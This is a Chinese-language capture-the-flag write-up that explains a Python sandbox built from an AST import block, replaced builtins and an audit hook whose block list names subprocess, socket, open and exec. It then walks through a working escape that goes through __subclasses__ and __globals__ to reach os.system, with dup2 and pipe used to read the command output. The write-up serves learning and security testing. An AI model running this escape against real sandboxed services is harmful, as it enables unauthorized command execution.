### SandboxVisitor
```python
class SandboxVisitor(ast.NodeVisitor):
    def visit_Import(self, node):
        raise SyntaxError("找不到外援呜呜呜")

    def visit_ImportFrom(self, node):
        raise SyntaxError("找不到外援呜呜呜")
```
在类名后面()写类表示继承
这个类继承了`ast.NodeVisitor`类:用于处理抽象语法树(ast)
简单来说,ast就是将程序解析成树的结构

而NodeVisitor则用于遍历ast的每个节点
遇到什么类型的节点,就调用对应的visit_<类型名>方法,默认跳过
这里重写了import方法和importfrom方法
重写后,调用nodevisitor识别到import和importfrom时就会抛出错误

#### 我们先了解一下I/O相关的知识:
首先,什么是fd(文件描述符):
系统在操纵文件的时候,如果每一次操作就寻找一次名字,会耗费大量的时间,
所以为了管理这些已经被**打开的**文件,系统用一个整数来对这个文件的:**打开状态,读取位置,权限等等**这个进程一个索引
有3个规定不变的fd:
- 0:标准输入
- 1:标准输出
- 2:标准错误
后面的文件就会顺延得到一个fd
****
那py的 `sys.stdin`和 `sys.stdout`是什么呢
他们在本质上是一个python对象,在默认情况下,他们就对应着fd的1和2 
如果你在py中写`print('hello')`,其实就是`sys.stdout.write("Hello")`

程序执行时的流程是:print->sys.stout->fd1->操作系统->终端

当然,你可以直接使用fd,跳过py对象使用os.write:`os.write(1, b"Hello")`
你也可以重写`sys.stout`:`sys.stdout = open("output.txt", "w")`
这里将原本到fd1的输出改成了写到文件中,此时调用print就不会再终端输出而是文件输出啦
****
那`StringIO`呢
也是一个python对象,是提个在内存中的"模拟文件"
可以用`getvalue()`方法来获取缓冲区里面的字段

****
现在看这里的代码就很清晰了
```python
    original_stdout = sys.stdout
    original_stderr = sys.stderr

    sys.stdout = io.StringIO()
    sys.stderr = io.StringIO()
```

将这里的print输出先保存在original里面
再把io导向内存缓冲区,在后面用`getvalue()`取出

#### 审计钩子(audit checker)
审计钩子是py3.8版本引入的新特性,审计钩子可以用来监控和记录 Python 程序在运行时的行为，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。
使用`sys.addaudithook(hook)`来使用
这里的hook参数本身是一个函数,定义的形式为`hook(event: str, args: tuple)`
其中event是事件的名称,而args包含了该事件的参数
一旦一个审计钩子被添加，它不能被移除。这是为了防止恶意代码移除审计钩子以逃避审计。

我们看题目的代码:
```python
def my_audit_checker(event, args):
        blocked_events = [
            "import", "subprocess.Popen", "socket.socket", "open",
            "builtins.eval", "builtins.exec", "builtins.__import__"
        ]
        if event.startswith("os.path") or event.startswith("os.path"):
             raise RuntimeError(f"做不到这个: {event}")
        if event in blocked_events or event.startswith("subprocess."):
            raise RuntimeError(f"做不到这个: {event}")

    try:
        sys.addaudithook(my_audit_checker)
    except RuntimeError:
        pass
```
首先将一系列敏感事件放进了`blocked_events`里面
这里除了`blocked_events`里面的事件还单独写了os.path,os.pathsub,process.这几个事件
这些事件就算想方设法的成功开始执行了,也会被钩子拦下,所以我们只能利用没有写到的

### 执行代码部分
```python
def safe_exec(code: str, timeout=1):
    try:
        code = code.encode().decode('unicode_escape')
    except UnicodeDecodeError:
        return "Error: Invalid unicode escape sequence."

    try:
        tree = ast.parse(code)
        SandboxVisitor().visit(tree)
    except (SyntaxError, ValueError) as e:
        return f"这个,做不到啊: {str(e)}"

    result_queue = multiprocessing.Queue()
    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))
    p.start()
    p.join(timeout=timeout)

    if p.is_alive():
        p.terminate()
        return "花了太久时间来执行了..."
    try:
        status, output = result_queue.get_nowait()
        return output if status == "ok" else f"这样似乎不行: {output}"
    except multiprocessing.queues.Empty:
        return "好像没有产生任何回应呢..."
    except Exception as e:
        return f"发生了一些意料之外的事: {str(e)}"
```

## 构造payload
大概复盘一下上面的沙盒:
1. 用ast来拦截import和fromimport
2. 将builtins重写
3. 使用审计钩子
只用想办法绕过这些函数,我们就能在其中执行命令

这里用到的思路和ssti注入相似:使用对象的特点,向上到object再向下找一个跳板类的init方法,从全局命名词典中拿到os(这里os没有在钩子的黑名单中),用os.system执行命令
思路清晰以后就好办了
用`s=().__class__.__base__`得到object类
加入`__subclasses__()`获得所有子类
查找之前我们想要的os类,确定是132个数组元素
所以`__subclasses__()[132]`

然后是他的构造方法,再到globals
`.__init__.__globals__`
诶这里出现了问题,服务器返回`这样似乎不行: 做不到这个: open`
说明这个操作触发了open操作
查阅了一下,我们在print一个对象时,会执行其对应的`__repr__()`方法
这个方法大部分是将对象转换为字符串,通常还可以用eval函数转换回来,
但对一些自定义对象,这个方法可能会干任何事

所以不要直接print这个对象,防止触发repr
所以只print名字即可
```python
s=().__class__.__base__.__subclasses__()[132].__init__.__globals__
for k in s:
    print(k)
```
找到了重要的`system`类
直接用键名获取函数,再执行
```python
s=().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']
```
****
诶,发现没有报错,但也没有返回值
还记得之前提到的输出输入流相关东西吗
这里使用的system就属于上面提到的直接使用fd1来输出
绕过了 sys.stdout这个python输出对象,而终端中的输出是经过沙盒修改
先进入StringIO内存缓冲区,再经过flask转发给我们
所以这里跳过了这一步,我们当然看不到了

直接print(s)呢,也不行,s使用system函数的返回值
我们需要用到一个新东西:**管道**
```python
s=().__class__.__base__.__subclasses__()[132].__init__.__globals__
r, w = s['pipe']()#建一个管道,包含read和write端
s['dup2'](w, 1)#把fd1放到write端
s['system']('ls')
print(s['read'](r, 10000).decode())#读read端,最多10000byte,再解码
```
这样就正常读到输出啦
后面就ls+cat就成功了!
